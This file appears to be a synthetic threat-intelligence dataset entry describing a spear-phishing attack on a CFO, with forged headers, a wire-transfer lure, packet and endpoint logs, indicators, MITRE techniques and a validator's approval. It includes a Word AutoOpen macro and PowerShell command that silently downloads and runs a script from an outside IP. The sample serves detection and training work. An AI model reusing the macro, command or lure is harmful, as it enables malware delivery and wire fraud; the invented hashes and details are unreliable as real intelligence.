@@ -1,0 +1,98 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Social Engineering",
+        "nature": "spear_phishing"
+      },
+      "example": {
+        "scenario": "Spear phishing campaign targeting CFO to execute fraudulent wire transfer via credential harvesting and malware payload delivery through a tailored email attachment.",
+        "technical_data": {
+          "email_headers": "Return-Path: <finance-support@micr0soft-secure.com>\r\nReceived: from mail.micr0soft-secure.com (mail.micr0soft-secure.com [203.0.113.45])\r\n\tby mail.corporate.local (Postfix) with ESMTPS id 9F1C5401234\r\n\tfor <cfo@corporate.local>; Mon, 15 May 2023 10:17:32 +0000 (UTC)\r\nReceived-SPF: pass (example.com: domain of finance-support@micr0soft-secure.com designates 203.0.113.45 as permitted sender)\r\nAuthentication-Results: mail.corporate.local; spf=pass smtp.mailfrom=micr0soft-secure.com; dkim=pass header.d=micr0soft-secure.com; dmarc=pass\r\nMessage-ID: <20230515101732.9F1C5401234@mail.micr0soft-secure.com>\r\nFrom: \"Microsoft Finance Support\" <finance-support@micr0soft-secure.com>\r\nTo: cfo@corporate.local\r\nSubject: Urgent: Review Attached Updated Wire Transfer Instructions\r\nDate: Mon, 15 May 2023 10:17:32 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_1234_567890\"\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Originating-IP: [198.51.100.22]\r\n",
+          "email_body_plain": "Dear CFO,\n\nPlease review the attached document containing the updated wire transfer instructions for the upcoming payment cycle. This change is due to new banking regulations effective immediately.\n\nKindly confirm receipt and processing at your earliest convenience.\n\nBest regards,\nMicrosoft Finance Support\n",
+          "email_body_html": "<html><body><p>Dear CFO,</p><p>Please review the attached document containing the updated wire transfer instructions for the upcoming payment cycle. This change is due to new banking regulations effective immediately.</p><p>Kindly confirm receipt and processing at your earliest convenience.</p><p>Best regards,<br>Microsoft Finance Support</p></body></html>",
+          "attachment": {
+            "filename": "WireTransfer_Instructions_2023-05-15.docm",
+            "md5": "3a6f0f8e4b3e2c67e8a3d5b1a9f1f2d4",
+            "sha256": "fbc3d7c2a1f9a4e4b0ed6f9d7f7e28f8e7c2a1e9b3d0c4a9e6f8d7c2a1f9b3e7",
+            "filetype": "Microsoft Word Macro-Enabled Document",
+            "macro_code_snippet": "Sub AutoOpen()\r\n  Dim objShell As Object\r\n  Set objShell = CreateObject(\"Wscript.Shell\")\r\n  objShell.Run \"powershell -NoProfile -WindowStyle Hidden -Command \\\"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.22/malware/payload.ps1')\\\"\"\r\nEnd Sub"
+          },
+          "smtp_transaction_log": [
+            "220 mail.micr0soft-secure.com ESMTP Postfix",
+            "EHLO attackerhost.example.com",
+            "250-mail.micr0soft-secure.com",
+            "250-PIPELINING",
+            "250-SIZE 10240000",
+            "250-VRFY",
+            "250-ETRN",
+            "250-STARTTLS",
+            "250-AUTH PLAIN LOGIN",
+            "250-ENHANCEDSTATUSCODES",
+            "250-8BITMIME",
+            "250 DSN",
+            "MAIL FROM:<finance-support@micr0soft-secure.com>",
+            "250 2.1.0 Ok",
+            "RCPT TO:<cfo@corporate.local>",
+            "250 2.1.5 Ok",
+            "DATA",
+            "354 End data with <CR><LF>.<CR><LF>",
+            "[email content]",
+            ".",
+            "250 2.0.0 Ok: queued as 9F1C5401234",
+            "QUIT",
+            "221 2.0.0 Bye"
+          ],
+          "dns_whois": {
+            "domain": "micr0soft-secure.com",
+            "registrant": "PrivacyGuard LLC",
+            "registration_date": "2023-04-20T14:32:00Z",
+            "expiration_date": "2024-04-20T14:32:00Z",
+            "nameservers": [
+              "ns1.privatedns.com",
+              "ns2.privatedns.com"
+            ],
+            "registrar": "NameCheap, Inc."
+          },
+          "url_obfuscation": "http://203.0.113.22/malware/payload.ps1",
+          "network_packet_capture_excerpt": "Frame 1: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 02:42:c0:a8:01:0a, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.1.10, Dst: 203.0.113.22\nTransmission Control Protocol, Src Port: 54321, Dst Port: 80, Seq: 1, Ack: 1\nHypertext Transfer Protocol\n    GET /malware/payload.ps1 HTTP/1.1\r\n    Host: 203.0.113.22\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: */*\r\n    Connection: Keep-Alive\r\n",
+          "endpoint_artifacts": {
+            "process_creation_log": "2023-05-15T10:20:42Z - Process created: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.22/malware/payload.ps1')",
+            "registry_keys_modified": [
+              "HKCU\\Software\\Microsoft\\Office\\Word\\Security\\Trusted Locations\\Location1 (added path to malware drop location)"
+            ],
+            "file_system_changes": [
+              "C:\\Users\\CFO\\AppData\\Local\\Temp\\payload.ps1 (created)"
+            ]
+          }
+        },
+        "indicators": {
+          "malicious_email_domain": "micr0soft-secure.com",
+          "attachment_hashes": {
+            "md5": "3a6f0f8e4b3e2c67e8a3d5b1a9f1f2d4",
+            "sha256": "fbc3d7c2a1f9a4e4b0ed6f9d7f7e28f8e7c2a1e9b3d0c4a9e6f8d7c2a1f9b3e7"
+          },
+          "malicious_urls": [
+            "http://203.0.113.22/malware/payload.ps1"
+          ],
+          "smtp_origin_ip": "203.0.113.45",
+          "process_command_line": "powershell.exe -NoProfile -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.22/malware/payload.ps1')"
+        },
+        "detection_method": "Email gateway and sandboxing detected macro-enabled document with suspicious AutoOpen macro invoking PowerShell download from known malicious IP. Network IDS flagged HTTP GET request to rare IP hosting known malware payload. Endpoint detection system logged suspicious PowerShell execution with encoded command-line invocation. Correlation of domain registration data and SPF pass with anomalous domain name similarity triggered threat intel alert on possible spear phishing.",
+        "relevant_mitre_techniques": [
+          "T1566.001 - Spearphishing Attachment",
+          "T1204.002 - User Execution: Malicious File",
+          "T1059.001 - PowerShell",
+          "T1105 - Ingress Tool Transfer",
+          "T1566 - Phishing"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a spear phishing attack targeting a high-value individual (CFO) within an organization, aligning well with the problem nature of highly targeted phishing campaigns. The scenario description clearly states the intent to execute a fraudulent wire transfer via credential harvesting and malware delivery, which is realistic and plausible in real-world contexts. All required fields are present and populated with detailed, coherent technical data including email headers, body, attachment with malicious macro code, SMTP logs, DNS WHOIS info, network capture, and endpoint artifacts. The indicators section effectively highlights key malicious elements such as the spoofed domain, attachment hashes, malicious URLs, and process command lines, providing clear evidence linking the sample to spear phishing. The detection method explanation is thorough, describing multiple layers of detection and correlation with threat intelligence, which supports the risk reduction strategies mentioned in the problem description. The inclusion of relevant MITRE ATT&CK techniques further enhances completeness and context. Overall, the sample is comprehensive, realistic, and well-aligned with the stated cybersecurity problem."
+      }
+    }
+  ]
+}
